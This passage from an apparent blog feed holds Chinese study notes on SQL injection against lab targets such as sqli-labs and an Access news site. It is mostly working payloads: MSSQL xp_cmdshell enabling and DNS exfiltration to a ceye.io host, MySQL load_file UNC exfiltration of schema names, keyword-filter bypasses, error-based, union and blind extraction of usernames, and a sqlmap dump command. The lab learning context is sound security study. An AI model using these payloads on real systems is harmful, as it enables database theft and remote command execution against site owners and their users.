&apos;.cmdshell.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p>我们可以看到执行的结果。</p><p><img src="/images/193dnslog45.png" alt></p><p><img src="/images/193dnslog46.png" alt></p><p>在 <code>Hackbar</code>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;; exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.hackbarcmd.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog47.png" alt></p><p><img src="/images/193dnslog48.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog25.png" alt></p><p><img src="/images/193dnslog26.png" alt></p><h3 id="MySQL-的-dnslog-外带数据注入"><a href="#MySQL-的-dnslog-外带数据注入" class="headerlink" title="MySQL 的 dnslog 外带数据注入"></a><code>MySQL</code> 的 <code>dnslog</code> 外带数据注入</h3><p><code>window</code>下在 <code>phpstudy_pro</code> 中 <code>C:\phpstudy_pro\Extensions\MySQL8.0.12</code> 下的 <code>my.ini</code>中添加：</p><p><code>secure_file_priv=</code> 重启服务。</p><p><img src="/images/193dnslog49.png" alt></p><h4 id="查询库名-1"><a href="#查询库名-1" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog27.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 1,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog28.png" alt></p><h4 id="查询-security-库中的表名"><a href="#查询-security-库中的表名" class="headerlink" title="查询 security 库中的表名"></a>查询 <code>security</code> 库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog43.png" alt></p><p><strong>注</strong>：也可以使用 <code>database()</code> 函数代替 <code>security</code>，不过要记住要先使用命令 <code>use security;</code> 否则会因当前没有使用的数据库造成失败。</p><h4 id="查询-emails-表中列名"><a href="#查询-emails-表中列名" class="headerlink" title="查询 emails 表中列名"></a>查询 <code>emails</code> 表中列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; and table_name = &apos;emails&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog44.png" alt></p><h3 id="sqli-labs-Less-25"><a href="#sqli-labs-Less-25" class="headerlink" title="sqli-labs Less-25"></a><code>sqli-labs Less-25</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog30.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog31.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog32.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; and &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog33.png" alt></p><p>发现页面变化了，并且把我们输入的 <code>and</code> 和 <code>or</code>给过滤掉了。改变单词内某些字母的大小写，依然无济于事。尝试用 <code>&amp;&amp;</code> 和 <code>||</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog35.png" alt></p><p>可以在网页上清除看到，<code>||</code> 并没有被过滤掉。</p><p>这里可以选择联合查询</p><p><img src="/images/193dnslog36.png" alt></p><p>由于数据库错误会提示报错信息，所以也可以选择报错注入。在这里我们通过 <code>&amp;&amp;</code> 和<code>||</code>注入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; &amp;&amp; updatexml(1, concat(&apos;~&apos;,(select database()), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog38.png" alt></p><p>可以发现 <code>&amp;&amp;</code> 及其后面的内容全部过滤掉了。</p><p>尝试使用 <code>||</code></p><p><img src="/images/193dnslog39.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog40.png" alt></p><p>发现把 <code>information_schema</code> 中的 <code>or</code> 给过滤掉了，尝试下 <code>infoorrmation_schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog41.png" alt></p><p>同理我们也可以查到列名。</p><p><img src="/images/193dnslog42.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 利用&lt;code&gt;mssql&lt;/code&gt; 数据库的 &lt;code&gt;dnslog&lt;/code&gt; 外带数据的方式进行注入，查询出库名表名；利用 &lt;code&gt;mysql&lt;/code&gt; 数据库在 &lt;code&gt;windows&lt;/code&gt; 系统中 &lt;code&gt;dnslog&lt;/code&gt; 外带数据进行注入。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="dnslog" scheme="http://yoursite.com/tags/dnslog/"/>
    
  </entry>
  
  <entry>
    <title>笔记37</title>
    <link href="http://yoursite.com/2019/09/04/note37/"/>
    <id>http://yoursite.com/2019/09/04/note37/</id>
    <published>2019-09-03T23:44:16.000Z</published>
    <updated>2019-09-09T05:58:15.728Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 二次注入，<code>Access</code>注入和 <code>Mssql</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一个注入点因为经过过滤处理，因此无法触发 sql 注入漏洞，比如 <code>addslashes</code> 函数，将单引号等预定义字符转义为 <code>\&#39;</code> 。存入数据库后，数据会还原，比如输入 <code>abc&#39;</code> ，如果发现一个新的注入点使用了该参数而且没有转义，则就会触发二次注入。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C194secinjec.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 二次注入，&lt;code&gt;Access&lt;/code&gt;注入和 &lt;code&gt;Mssql&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="二次注入" scheme="http://yoursite.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习13</title>
    <link href="http://yoursite.com/2019/09/03/practice13/"/>
    <id>http://yoursite.com/2019/09/03/practice13/</id>
    <published>2019-09-03T10:52:23.000Z</published>
    <updated>2019-09-09T05:55:39.752Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对 <code>Mssql</code> 和 <code>Access</code> 数据库使用报错注入和联合查询方法查询库名表名字段名。</p><a id="more"></a><!--export--><!--toc--><h3 id="MSSQL-SQLi-Labs-环境注入"><a href="#MSSQL-SQLi-Labs-环境注入" class="headerlink" title="MSSQL-SQLi-Labs 环境注入"></a><code>MSSQL-SQLi-Labs</code> 环境注入</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>在 <code>id=1&#39;</code> 后加上 <code>&#39;</code>，页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;</span><br></pre></td></tr></table></figure><p>继续在后面补上 <code>-- |</code> 页面正常显示。</p><p><img src="/images/191mssql1.png" alt></p><h4 id="确认字段数"><a href="#确认字段数" class="headerlink" title="确认字段数"></a>确认字段数</h4><p>先写上 4，发现页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 4 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql2.png" alt></p><p>修改为 3，页面正常显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql3.png" alt></p><h4 id="确认页面能够显示的位置"><a href="#确认页面能够显示的位置" class="headerlink" title="确认页面能够显示的位置"></a>确认页面能够显示的位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  union select (@@version),2,3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql4.png" alt></p><h4 id="布尔盲注查-version"><a href="#布尔盲注查-version" class="headerlink" title="布尔盲注查 version"></a>布尔盲注查 <code>version</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;211 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;212 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql6.png" alt></p><p>故可以推断，<code>version</code> 长度为 <code>212</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;76 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;77 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql8.png" alt></p><p>可以推断出第一个字符的 <code>ACSII</code> 码为 <code>77</code>，即第一个字母为 <code>M</code>。通过这个方法，我们可以确定其他字符。</p><h4 id="联合查询判断库名"><a href="#联合查询判断库名" class="headerlink" title="联合查询判断库名"></a>联合查询判断库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, 3 from (select top 1 schema_name from information_schema.schemata order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, db_name() from (select top 1 schema_name from information_schema.schemata where schema_name not in (&apos;dbo&apos;, &apos;accessadmin&apos;, &apos;guest&apos;, &apos;db_accessadmin&apos;,&apos;db_backupoperator&apos;, &apos;db_datareader&apos;, &apos;db_datawriter&apos;,&apos;db_ddladmin&apos;)) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p>逐个确认库名</p><p><img src="/images/191mssql22.png" alt></p><h4 id="联合查询判断表名"><a href="#联合查询判断表名" class="headerlink" title="联合查询判断表名"></a>联合查询判断表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql11.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables where table_name not in (&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) and table_schema=&apos;dbo&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql23.png" alt></p><h4 id="联合查询判断字段名"><a href="#联合查询判断字段名" class="headerlink" title="联合查询判断字段名"></a>联合查询判断字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, column_name, 3 from (select top 1 column_name from information_schema.columns order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql12.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=-1&apos; union select 1, column_name, db_name() from (select top 1 column_name from information_schema.columns where column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) and table_name=&apos;users&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql24.png" alt></p><h4 id="报错注入判断库名"><a href="#报错注入判断库名" class="headerlink" title="报错注入判断库名"></a>报错注入判断库名</h4><p>先判断是否为 <code>mssql</code>，执行下面语句若显示正常则为 <code>mssql</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and exists(select * from sysobjects) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql13.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and 1=convert(int, (select @@version)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql14.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata ))  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql15.png" alt></p><p>查到第一库为 <code>dbo</code>，通过 <code>not in</code> 条件，把每次查出来的表名加进去，这样就可以慢慢把所有表的遍历出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql16.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;, &apos;db_accessadmin&apos;) )) -- |</span><br></pre></td></tr></table></figure><p>以此类推可以查询出全部库名</p><h4 id="报错注入查询表名"><a href="#报错注入查询表名" class="headerlink" title="报错注入查询表名"></a>报错注入查询表名</h4><p>第一张表是 <code>emails</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(emails&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql17.png" alt></p><p>多次执行后，当执行到下面这条语句时，页面无显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql18.png" alt></p><h4 id="报错注入查询users表的字段名"><a href="#报错注入查询users表的字段名" class="headerlink" title="报错注入查询users表的字段名"></a>报错注入查询<code>users</code>表的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos;)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql19.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql20.png" alt></p><p>改为桥接模式，继续做。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;, &apos;username&apos;, &apos;password&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql21.png" alt></p><h3 id="Access-数据库"><a href="#Access-数据库" class="headerlink" title="Access 数据库"></a><code>Access</code> 数据库</h3><h4 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>找到新闻展示界面，可能存在注入点</p><p><img src="/images/192access1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/192access.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5-1</span><br></pre></td></tr></table></figure><p><img src="/images/192access2.png" alt></p><h4 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from MSysAccessObjects)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/192access3.png" alt></p><h4 id="判断个数"><a href="#判断个数" class="headerlink" title="判断个数"></a>判断个数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 order by 11</span><br></pre></td></tr></table></figure><p><img src="/images/192access4.png" alt></p><h4 id="猜表名及判断各输出位置"><a href="#猜表名及判断各输出位置" class="headerlink" title="猜表名及判断各输出位置"></a>猜表名及判断各输出位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,2,3,4,5,6,7,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,id,title,4,5,6,content,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from user)</span><br></pre></td></tr></table></figure><p><img src="/images/192access6.png" alt></p><h4 id="使用-top-1"><a href="#使用-top-1" class="headerlink" title="使用 top 1"></a>使用 <code>top 1</code></h4><p>由上面的内容可知表 <code>news</code>中存在字段 <code>id</code>，<code>title</code> 和 <code>content</code>。尝试判断第一个 <code>title</code> 的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;29</span><br></pre></td></tr></table></figure><p><img src="/images/192access7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;30</span><br></pre></td></tr></table></figure><p><img src="/images/192access8.png" alt></p><p>第一个标题长度为 <code>30</code>。</p><p>尝试判断 <code>user</code> b表中字段 <code>username</code> 第一个值</p><p><img src="/images/192access9.png" alt></p><p><code>username</code> 中数据的个数，由下图可知总共两个数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select count(username) from user)&gt;1</span><br></pre></td></tr></table></figure><p><img src="/images/192access19.png" alt></p><p>判断第一个 <code>username</code> 的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user)&gt;4</span><br></pre></td></tr></table></figure><p><img src="/images/192access13.png" alt></p><p>第一个用户名的长度为 <code>5</code>。</p><p>判断第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;96</span><br></pre></td></tr></table></figure><p><img src="/images/192access10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;97</span><br></pre></td></tr></table></figure><p><img src="/images/192access11.png" alt></p><p>第一个字符的 <code>ASCII</code> 码为 <code>a</code></p><p>判断第二个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user)&gt;99</span><br></pre></td></tr></table></figure><p><img src="/images/192access12.png" alt></p><p>第二个字符为 <code>d</code>。</p><p>判断第三个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user)&gt;108</span><br></pre></td></tr></table></figure><p><img src="/images/192access14.png" alt></p><p>第三个字符为 <code>m</code>。</p><p>判断第四个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user)&gt;104</span><br></pre></td></tr></table></figure><p><img src="/images/192access15.png" alt></p><p>第四个字符为 <code>i</code></p><p>判断第最后一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user)&gt;109</span><br></pre></td></tr></table></figure><p><img src="/images/192access16.png" alt></p><p>最后一个字符为 <code>n</code></p><p><code>username</code> 的第二个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user where username not in (&apos;admin&apos;))&gt;4</span><br></pre></td></tr></table></figure><p>长度为 <code>5</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user where username not in(&apos;admin&apos;))&gt;108</span><br></pre></td></tr></table></figure><p>第一个字符为 <code>m</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user where username not in(&apos;admin&apos;))&gt;100</span><br></pre></td></tr></table></figure><p>第二个字符为 <code>e</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user where username not in(&apos;admin&apos;))&gt;107</span><br></pre></td></tr></table></figure><p>第三个字符为 <code>l</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>第四个字符为 <code>y</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>最后一个字符为 <code>y</code></p><p>用 <code>sqlmap</code> 验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.179.132/shownews.asp?id=3"</span> -T user -C username --dump</span><br></pre></td></tr></table></figure><p><img src="/images/192access18.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对 &lt;code&gt;Mssql&lt;/code&gt; 和 &lt;code&gt;Access&lt;/code&gt; 数据库使用报错注入和联合查询方法查询库名表名字段名。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
